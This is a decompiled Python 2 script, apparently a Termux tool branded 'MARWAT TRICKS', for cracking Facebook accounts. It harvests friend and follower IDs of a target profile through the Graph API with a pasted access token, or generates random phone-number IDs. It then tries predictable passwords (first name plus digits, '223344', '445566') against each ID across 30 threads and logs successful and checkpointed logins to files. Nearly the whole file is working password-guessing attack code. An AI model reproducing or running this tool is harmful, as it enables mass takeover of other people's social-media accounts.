# Source Generated with Decompyle++
# File: out (Python 2.7)


try:
    import os
    import sys
    import time
    import datetime
    import random
    import hashlib
    import re
    import threading
    import json
    import getpass
    import urllib
    import cookielib
    import requests
    import uuid
    import string
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 hop.py')


try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
os.system('git pull')
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

from requests.exceptions import ConnectionError
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
reload(sys)
sys.setdefaultencoding('utf8')
logo = '\n\n\n ##     ## MARWAT.......TRICKS         ##\n\n ------------------------------------------\n\n   Author : W W E\n   Github : https://github.com/***\n   Decompiling will not make you coder\n\n ----------------------------------------- '

def reg():
    os.system('clear')
        
        
def method():
    os.system('clear')
    print logo
    print ''
    print '\tSelect cloninig '
    print ''
    print '[1] Login cloning'
    print '[2] Without login cloning'
    print ''
    ms()


def ms():
    s = raw_input(' Choose option: ')
    if s == '1':
        login()
    elif s == '2':
        wlogin()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        ms()


def wlogin():
    id = []
    oks = []
    cps = []
    os.system('clear')
    print logo
    print ''
    print '\tWithout login'
    print ''
    c = raw_input(' Code: ')
    
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            id.append(li.strip())
    except (KeyError, IOError):
        print ''
        print '\t Numbers file not found'
        print ''
        os.system('exit')

    print ' Total numbers: ' + str(len(id))
    print ' The process has been started'
    print ' Press ctrl + z to stop'
    print ''
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        
        try:
            pass1 = user
            data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/successful.txt', 'a')
                ok.write(c + user + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[MT-CP] ' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(c + user + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(c + user + pass1)
            else:
                pass2 = c + user
                data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/successful.txt', 'a')
                    ok.write(c + user + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[MT-CP] ' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(c + user + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(c + user + pass2)
                else:
                    pass3 = '223344'
                    data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/successful.txt', 'a')
                        ok.write(c + user + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[MT-CP] ' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(c + user + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(c + user + pass3)
                    else:
                        pass4 = '445566'
                        data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/successful.txt', 'a')
                            ok.write(c + user + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[MT-CP] ' + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(c + user + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(c + user + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    wlogin()


def login():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print '\tLogin menu'
        print ''
        token = raw_input(' Paste token here: ')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        menu()



def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers = header)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tLogged in token has expired'
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    toc = open('/sdcard/.hs.txt', 'r').read()
    print logo
    print ''
    print ' Logged in user: ' + name
    print ''
    print ' Active token: ' + toc
    print ''
    print 47 * '-'
    print ''
    print ' [1] Crack with name pass'
    print ' [2] Crack with digit pass'
    print ' [3] Extract ids'
    print ''
    menu_option()


def menu_option():
    select = raw_input(' Choose option: ')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '3':
        ex_id()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\tCrack with Name pass'
    print ''
    print '[1] Crack public id'
    print '[2] Crack followers'
    print '[3] Crack file'
    print '[0] Back'
    print ''
    crack_select()


def crack_select():
    select = raw_input(' Choose option: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\tName pass cracking'
        print ''
        idt = raw_input(' Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\tName pass cracking'
            print ''
            print ' Cloning from : ' + q['name']
        except KeyError:
            print '\tInvalid Link'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print '\tName pass cracking'
        print ''
        idt = raw_input(' Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\tName pass cracking'
            print ''
            print ' Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '3':
        os.system('clear')
        print logo
        print ''
        print '\tName pass cracking'
        print ''
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        
        try:
            filelist = raw_input(' File : ')
            os.system('clear')
            print logo
            print ''
            print '\tName pass cracking'
            print ''
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print ''
            print '\tRequested file not found'
            print ''
            raw_input(' Press enter to back ')
            crack()
        

    if select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


def ex_id():
    global token
    idg = []
    
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print '\tToken not found'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\tCOLLECT PUBLIC ID FRIENDLIST'
    print ''
    idh = raw_input(' Input Id: ')
    
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers = header)
        q = json.loads(r.text)
        print ' Collecting from: ' + q['name']
    except KeyError:
        print ''
        print '\tInvalid id provided'
        print ''
        raw_input(' Press enter to back')
        menu()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers = header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')
    
    ids.close()
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total ids: ' + str(len(idg))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to download file')
    os.system('cp ids_friends.txt /sdcard')
    os.system('rm -rf ids_friends.txt')
    print ' File downloaded successfully'
    time.sleep(1)
    menu()


def choice():
    global token
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\tDigit pass cracking'
    print ''
    print '[1] Crack public id'
    print '[2] Crack followers'
    print '[3] Crack file'
    print '[0] Back'
    print ''
    choice_select()


def choice_select():
    select = raw_input('Choose option: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\tDigit pass cracking'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\tDigit pass cracking'
            print ' Cloning from : ' + q['name']
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print '\tDigit pass cracking'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '\tDigit pass cracking'
            print ''
            print ' Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '3':
        os.system('clear')
        print logo
        print ''
        print '\tDigit pass cracking'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        filelist = raw_input(' Input file: ')
        os.system('clear')
        print logo
        print ''
        print '\tDigit pass cracking'
        print ''
        
        try:
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print ''
            print '\tRequested file not found'
            print ''
            raw_input(' Press enter to back ')
            choice()
        

    if select == '0':
        menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[MT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[MT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    choice()

if __name__ == '__main__':
    reg()
